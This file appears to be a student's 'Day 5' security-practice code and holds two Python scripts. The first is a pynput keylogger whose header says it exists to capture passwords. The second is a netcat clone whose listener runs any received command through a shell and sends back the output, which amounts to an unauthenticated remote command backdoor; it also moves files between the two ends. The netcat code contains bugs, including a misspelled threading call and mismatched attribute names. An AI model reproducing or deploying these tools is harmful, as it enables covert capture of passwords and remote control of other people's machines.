#DAY 5
#PYTHON KEYLOGGER - IT SPIES THE COMPUTER KEYBOARD AND SAVES ALL THE TEXT CLICKED BY THE KEYBOARD IT IS USED TO SNIP PASSWORDS
"""
EDUCATIONAL KEYLOGGER — FOR YOUR OWN MACHINE ONLY
Captures every keypress with timestamp and logs to a file.
Press ESC to stop.
Purpose: Learn how attackers spy — so you can DEFEND against it.
"""

from pynput import keyboard  # Listen to keyboard events
import datetime  # For timestamps


class EducationalKeylogger:
    """
    A simple keylogger that records all keystrokes on your own machine.
    """

    def __init__(self, log_file="keystrokes.log"):
        """
        Set up the log file name and an empty list to store keys.
        """
        self.log_file = log_file  # File to save the log
        self.current_keys = []  # List to hold all captured keys
        self.is_recording = False  # (Reserved for future use)

    def on_press(self, key):
        """
        Called automatically whenever a key is pressed.
        Adds the key (with timestamp) to the list.
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # Check if it's a regular character (like 'a', '5', '?')
            if hasattr(key, 'char') and key.char is not None:
                self.current_keys.append(key.char)
            else:
                # It's a special key – map it to a human‑readable label
                special_keys = {
                    keyboard.Key.space: ' [SPACE] ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: ' [TAB] ',
                    keyboard.Key.backspace: ' [BACKSPACE] ',
                    keyboard.Key.shift: ' [SHIFT] ',
                    keyboard.Key.ctrl_l: ' [CTRL] ',
                    keyboard.Key.ctrl_r: ' [CTRL] ',
                    keyboard.Key.alt_l: ' [ALT] ',
                    keyboard.Key.alt_r: ' [ALT] ',
                    keyboard.Key.esc: ' [ESC] ',
                    keyboard.Key.up: ' [UP] ',
                    keyboard.Key.down: ' [DOWN] ',
                    keyboard.Key.left: ' [LEFT] ',
                    keyboard.Key.right: ' [RIGHT] ',
                    keyboard.Key.f1: ' [F1] ',
                    keyboard.Key.f2: ' [F2] ',
                    # Add more if needed
                }
                # If the key is in the dictionary, use that label; otherwise, use its technical name
                self.current_keys.append(special_keys.get(key, f' [{str(key)}] '))
        except Exception as e:
            print(f"Error capturing key: {e}")

    def on_release(self, key):
        """
        Called when a key is released.
        If the released key is ESC, we stop the listener.
        """
        if key == keyboard.Key.esc:  # <--- FIXED: Key.esc (not key.esc)
            return False  # Stops the listener

    def start_logging(self):
        """
        Starts the keylogger:
        - Writes a header to the log file.
        - Creates a listener that calls on_press and on_release.
        - Waits until the listener stops (ESC pressed or Ctrl+C).
        - Then saves the log.
        """
        print("[*] KEYLOGGER STARTING...")
        print("[*] PRESS ESC TO STOP IT.")
        print(f"[*] Logging to: {self.log_file}")

        # Write a start marker (overwrites any previous log)
        with open(self.log_file, 'w') as f:
            f.write(f"=== KEYLOGGER STARTED: {datetime.datetime.now()} ===\n")
            f.write("=" * 50 + "\n\n")

        # Create the listener with our callback functions
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:

            try:
                # Block and wait until the listener stops (on_release returns False)
                listener.join()
            except KeyboardInterrupt:
                # If you press Ctrl+C in the terminal, stop gracefully
                print("\n[*] KEYLOGGER STOPPED BY KEYBOARD INTERRUPT")

        # After the listener stops, save all captured keystrokes to the file
        self.save_log()
        print(f"[*] Log saved to {self.log_file}")

    def save_log(self):
        """
        Appends the collected keystrokes to the log file with an end marker.
        """
        with open(self.log_file, 'a') as f:  # 'a' = append mode
            f.write("\n" + "=" * 50 + "\n")
            f.write(f"=== SESSION ENDED: {datetime.datetime.now()} ===\n\n")
            # Join all the captured key strings into one big string and write
            f.write("".join(self.current_keys))

    def display_log(self):
        """
        Helper to read and print the entire log file.
        """
        try:
            with open(self.log_file, 'r') as f:
                content = f.read()
                print("\n" + "=" * 50)
                print("KEYSTROKE LOG:")
                print("=" * 50)
                print(content)
        except FileNotFoundError:
            print("[!] Log file not found. Nothing to display.")


# ==================== RUN ====================
if __name__ == "__main__":
    logger = EducationalKeylogger()
    logger.start_logging()
    # Optionally, uncomment the next line to show the log after stopping:
    # logger.display_log()
















































#DAY 5
#NETCAT CLONE
import socket
import subprocess
import os
import threading
import argparse



class Netcatclone:
    def __init__(self,host="0.0.0.0",port=80):
        self.host = host
        self.port = port
        self.socket = None
        self.connection = []
        self.buffer_size = 4096   #4 kb at a time
    def start_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            print(f"[*] Listening on {self.host}:{self.port}")
            print("[*] Press CTRL+C to stop the server")

            while True:
                client_sock, client_addr = self.socket.accept()
                print(f"[*] Connection from {client_addr[0]}:{client_addr[1]}")
                self.connection.append(client_sock)

                client_thread = threading.thread(
                    target=self.handle_client,
                    args=(client_sock, client_addr)
                )
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("[*]SHUTTING DOWN SERVER...")
            self.cleanup()
        except Exception as e:
            print(f"ERROR:{e}")
    def handle_client(self, client_sock, client_addr):
        while True:
            try:
                data = client_sock.recv(self.buffer_size).decode('utf-8')
                if not data:
                    break
                if data.startswith('cmd:'):
                    command = data[4:].strip()
                    result = self.execute_command(command)
                    client_sock.send(result.encode('utf-8'))

                elif data == '/quit':
                    print(f"[*]Client {client_addr[0]} Requested Disconnection")
                    break
                else:
                    print(f"\n[Message from {client_addr[0]}:{data}")
            except ConnectionResetError:
                print(f"[*]Client {client_addr[0]} Disconnected abruptly")
                break
            except Exception as e:
                print(f"ERROR:{e}")
                break
        if client_sock in self.connections:
            self.connections.remove(client_sock)
        client_sock.close()
        print(f"[*]Client {client_addr[0]}Disconnected")


#------CLIENT MODE-------
    def start_client(self, target_host, target_port):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((target_host, target_port))
            print(f"[*] Connected to {target_host}:{target_port}")

            recv_thread = threading.Thread(target=self.receive_messages)
            recv_thread.daemon = True
            recv_thread.start()

            while True:
                user_input = input()

                if user_input.lower() == '/quit':
                    self.socket.send('/quit'.encode('utf-8'))
                    break
                elif user_input.lower().startswith('/send'):
                    filename = user_input[6:].strip()
                    self.send_file(filename)

                elif user_input.lower().startswith('/cmd'):
                    command = user_input[5:].strip()
                    self.socket.send(f"cmd:{command}".encode('utf-8'))
                else:
                    self.socket.send(user_input.encode('utf-8'))
        except KeyboardInterrupt:
            print("\n[*] Disconnecting...")
        except ConnectionResetError:
            print("[!] Connection refused--- is server running?")
        except Exception as e:
            print(f"ERROR:{e}")
        finally:
            self.cleanup()

    def receive_messages(self):
        while True:
            try:
                data = self.socket.recv(self.buffer_size).decode('utf-8')
                if not data:
                    print("[!] Server Disconnected.")
                    break
                print(f"\n [Server]:{data}")

            except Exception as e:
              print(f"[!] Error receiving: {e}")
              break

    def send_file(self, filename):
        if not os.path.exists(filename):
            print(f"[!]File '{filename}' does not exist")
            return
        try:
            with open(filename, 'rb') as f:
                file_data = f.read()
            header = f"FILE:{os.path.basename(filename)}:{len(file_data)}".encode('utf-8')
            self.socket.send(header + b'\n')
            self.socket.send(file_data)
            print(f"[!] File '{filename}' Sent successfully.")
        except Exception as e:
            print(f"[!] Error sending file:{e}")

    def receive_file(self,client_sock):
        try:
            header = client_sock.recv(self.buffer_size).decode('utf-8')
            if not header.startswith('FILE:'):
                print("[!] Not a Valid FILE transfer header.")
                return
            _, filename, filesize = header.strip().split(':')
            filesize =  int(filesize)

            file_data = b''
            while len(file_data) < filesize:
                chunk = client_sock.recv(min(self.buffer_size, filesize - len(file_data)))

                if not chunk:
                    break
                file_data += chunk

            if len(file_data) != filesize:
                print(f"[!]File received incomplete.")
                return
            new_filename = f"received_{filename}"
            with open(new_filename, 'wb') as f:
                f.write(file_data)
            print(f"[!] File received as saved as '{new_filename}'")
        except Exception as e:
            print(f"[!] Error receiving file:{e}")


        #----COMMAND EXECUTION----

    def execute_command(self, command):
        try:
            result = subprocess.run(
                command,
                shell=True,  # Run through the shell (like cmd or bash)
                capture_output=True,  # Capture stdout and stderr
                text=True,  # Return as strings, not bytes
                timeout=10  # Stop after 10 seconds to avoid hanging
            )
            if result.stdout:
                return f"[Output]\n{result.stdout}"
            elif result.stderr:
                return f"[Error]\n{result.stderr}"
            else:
                return "[+]Command executed successfully.(no output)"
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[!] Error Executing Command: {e}"


        #-----COMMAND LINE INTERFACE-----Parse command-line arguments and start the right mode.


def main():
        parser = argparse.ArgumentParser(description='Netcat Clone')
        parser.add_argument('-l', '--listen', action='store_true',
                            help='Run in listener (server) mode')
        parser.add_argument('-c', '--connect', help='Connect to IP:PORT (client)')
        parser.add_argument('-p', '--port', type=int, default=4444,
                            help='Port to use (default: 4444)')
        args = parser.parse_args()

        nc = Netcatclone(port=args.port)

        if args.listen:
            nc.start_server()
        elif args.connect:
            try:
                host, port = args.connect.split(':')
                nc.start_client(host, int(port))
            except ValueError:
                print("[!] Use IP:PORT format.")
        else:
            parser.print_help()
if __name__ == "__main__":
    main()










